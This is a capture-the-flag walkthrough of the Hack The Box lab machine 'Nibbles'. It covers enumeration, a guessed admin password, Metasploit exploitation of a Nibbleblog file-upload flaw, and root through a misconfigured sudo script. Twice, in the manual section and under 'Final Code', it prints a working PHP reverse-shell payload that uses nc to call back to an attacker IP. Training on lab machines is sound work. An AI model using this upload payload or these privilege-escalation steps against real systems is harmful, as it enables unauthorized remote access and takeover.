# Nibbles - HTB

Nibbles - 10.10.10.75

![](/images/nibbles/1. nibbles.png "Nibbles Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Nibbles provides us a straightforward example of researching software we encounter along the way and then enumerating additional details to determine whether the specific configuration we are up against is vulnerable or not. 

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

For Nibbles we will take a look at a particular type of blogging software, discover the running version on our target and then use both Metasploit and manual methods to trigger a remote shell. A sudo misconfiguration allows us to escalate to root. 

-1- nmap

-2- searchsploit

-3- msfconsole

-4- dirbuster

-5- msf module: exploit/multi/http/nibbleblog_file_upload

-6- .sh scripting

-7- .php reverse shell

-8- nc

-9- sudo misconfiguration

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start off with an easy nmap scan:

    nmap -A -T4 10.10.10.75

![](/images/nibbles/2. nmap.png)

Browse to the website:

![](/images/nibbles/3. website.png)

View page source because this is not much to work with (Use the source, Luke!):

![](/images/nibbles/3. website_source.png)

Here we have a comment in the code pointing us towards /nibbleblog/ so let's check out http://10.10.10.75/nibbleblog/

![](/images/nibbles/4. nibbleblog.png)

We have some sort of an application here. It looks like a blog (based on the name, and features). In the lower right we see “Powered by Nibbleblog” so let's searchsploit for that:

    searchsploit nibbleblog

![](/images/nibbles/5. searchsploit.png)

There is a remote Arbitrary File Upload for Nibbleblog 4.0.3, and a Metasploit module for it. Let's load the module and see what else we can learn:

    msfconsole

    search nibble

    use 0

![](/images/nibbles/6. msf_search.png)

Now let's show some info:

    info

![](/images/nibbles/7. info.png)

The exploit requires valid credentials ("authenticated remote attacker"), so we need to enumerate and look for valid creds. This also means there is likely a login portal or app that we should be able to find to use the creds on. Time to fire up dirbuster:

    dirbuster &

Set your options as shown below and hit Start:

Target URL: http://10.10.10.75:80/

Check the box next to “Go Faster”

File with list of dirs/files: /usr/share/wordlists/dirbuster/directory-list-2.3.-medium.txt

Dir to start with: /nibbleblog

File extension: php

![](/images/nibbles/8. dirbuster_options.png)

On the results tab you will start to see a lot of info pour in:

![](/images/nibbles/9. dirbuster_results.png)

Here we see "/nibbleblog/admin.php". Anytime we see an “admin” or “login” or “manager” file, these are of interest.  Let's browse to it: http://10.10.10.75/nibbleblog/admin.php

![](/images/nibbles/10. admin_php.png)

And here's our login panel we thought we'd find.  Maybe there are default credentials?

Google “nibbleblog default credentials”

Unfortunately, nothing useful comes up. Looks like it does not have a default password, so we need to enumerate more. In our dirbuster results, we saw another directory: "nibbleblog/content". Maybe we can browse there and find some credentials?

![](/images/nibbles/11. content.png)

Let's try the private/ sub-directory:

![](/images/nibbles/12. private.png)

Okay, users.xml looks interesting, maybe it will have a list of users?

![](/images/nibbles/13. users_xml.png)

Here we have a username, “admin”.  Now what for a password? Unfortunately, none of the other files seem to shed any light. After some educated guessing we arrive with a successful login of:

admin : nibbles

![](/images/nibbles/14. dashboard.png)

And we're in! Turns out the password “nibbles” was right in front of us from the beginning (again, HTB with the name of the box as a clue). Now let's search for a version to confirm whether or not we can use our Metasploit module.

In the above screenshot there is a Settings page on the left side, click it.

![](/images/nibbles/15. version.png)

If you scroll down on the Settings page you will eventually see the above. Version is 4.0.3 which means our Metasploit module should work. Let's give it a shot.

<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

Return to your terminal window with msfconsole, or load it up again:

    use exploit/multi/http/nibbleblog_file_upload

    set USERNAME admin

    set PASSWORD nibbles

    set RHOSTS 10.10.10.75

    set TARGETURI /nibbleblog

    show options
    
![](/images/nibbles/16. msf_set.png)
![](/images/nibbles/16. msf_set_2.png)

All of our options look proper. Let's give this a try:

    run

![](/images/nibbles/17. run.png)

And we have a meterpreter shell!  If your exploit stalls at the “[+] Deleted image.php” step, do not worry. Just give it a moment and your meterpreter prompt should appear.

Now for some enum:

    getuid

    sysinfo

![](/images/nibbles/18. getuid_sysinfo.png)

We are user “nibbler” and this is a 64-bit Ubuntu Linux, 4.4.0-104-generic kernel machine. We need to privesc, but first let's drop into an actual shell on the box:

    shell
    
    pwd

![](/images/nibbles/19. shell.png)

We are low-privileged user “nibbler”, so let's start by going to our home folder:

    cd /home/nibbler

    ls -la

![](/images/nibbles/20. home.png)

Learning point: Here you can see LinEnum.sh and linuxprivchecker.py are in /home/nibbler/ which means others were working on the box and did not clean up after themselves. Please do not be that gal or guy...

We do see user.txt here so let's grab that flag:

    cat user.txt

![](/images/nibbles/21. user.png)

And we have our user flag. 

Time to enumerate a path for privilege escalation. There is nothing in .bash_history, but the personal.zip looks interesting so let's check it out.

    unzip personal.zip

![](/images/nibbles/22. unzip.png)

Let's see what permissions we have to monitor.sh:

    ls -la personal/stuff

![](/images/nibbles/23. stuff.png)

We own the file and can read/write/execute it at will. When you cat it though, the current contents are no help. Now, let's check a quick “sudo -l” before we start uploading any scripts of our own.

![](/images/nibbles/24. sudo_l.png)

Here we see user nibbler can run the monitor.sh from /home/nibbler/personal/stuff/ as root without a password. The lack of a required password represents a sudo misconfiguration. 

Now all we need to do is replace the script's current contents with something that will give us a shell. Even something simple like: bash -i

    cd personal/stuff

    echo "bash -i" > monitor.sh

![](/images/nibbles/25. echo.png)

    sudo /home/nibbler/personal/stuff/monitor.sh

Note: If you move monitor.sh to another directory, your sudo command will not work. Also, as a best practice when using sudo, give the the full path to the file/script you want to execute.

![](/images/nibbles/26. monitor.png)

    id

![](/images/nibbles/27. id.png)

Success! We are root. Let's go get our root flag:

    cat /root/root.txt

![](/images/nibbles/28. root_flag.png)

And we have our root flag.

<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================

For manual exploitation we are going to exploit the same vulnerability used by the metasploit module by uploading a malicious .php file using the credentials from our enumeration: admin : nibbles

First, log back into the nibbleblog dashboard at: http://10.10.10.75/nibbleblog/admin.php

![](/images/nibbles/29. dashboard.png)

Back on the Dashboard of the admin login, we see a “Plugins” section on the left side. Click it.

Under the My Image plugin, click Configure

![](/images/nibbles/30. plugins.png)

Here we can upload a maclicious php file to gain a reverse shell.  We can look-up php one-liners and then create a php file to do what we need. In this case I took a /bin/sh one-liner and added nc execution to call back to my attacking machine, then wrapped it in a php system command. This is not the simplest one-liner you can use here, but it works:

    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 17011 >/tmp/f"); ?>

![](/images/nibbles/31. php_file.png)

Create a .php file (call-back.php in my case) and put the above code into it. Save it and then use the nibbleblog My Image plugin to upload it: 

Click “Browse” then select the call-back.php file

Click “Save Changes”.  You should see a message stating “Changes have been saved successfully.”

Now we are ready to trigger the php file. Set up your nc listener in a Kali terminal window:

    nc -lvnp 17011

Then navigate to the following: http://10.10.10.75/nibbleblog/content/private/plugins/my_image/

![](/images/nibbles/32. myimage.png)

You will see a folder listing with an “image.php” file. Click on it and your browser may appear to hang, but over in your nc listener window you should see:

![](/images/nibbles/33. nc_connection.png)

Success!  We have a shell.  Now for enum.

    whoami

![](/images/nibbles/34. whoami.png)

So we are user nibbler, let's go to our /home/nibbler folder

    cd /home/nibbler

Here we can grab the user flag:
    cat user.txt

![](/images/nibbles/35. user.png)

As before, the file /home/nibbler/personal.zip looks interesting, so let's extract it:
    
    unzip personal.zip

    ls -la personal/stuff/monitor.sh

![](/images/nibbles/36. personal.png)

So here we have monitor.sh that we can edit and execute.  Now let's check sudo permissions.

    sudo -l

![](/images/nibbles/37. sudo_l.png)

So we can run monitor.sh as root!  You can edit the script to just give an interactive bash shell:

    echo “bash -i” > personal/stuff/monitor.sh

    cat personal/stuff/monitor.sh

![](/images/nibbles/38. echo.png)

Now let's run it!

    sudo personal/stuff/monitor.sh

![](/images/nibbles/39. monitor.png)

Success!  Let's go get our root flag:

    cat /root/root.txt

![](/images/nibbles/40. root.png)

And here we have our flags.

<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

call-back.php:

      <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 17011 >/tmp/f"); ?>

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. Rapid7 Metasploit module entry: [https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload)

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
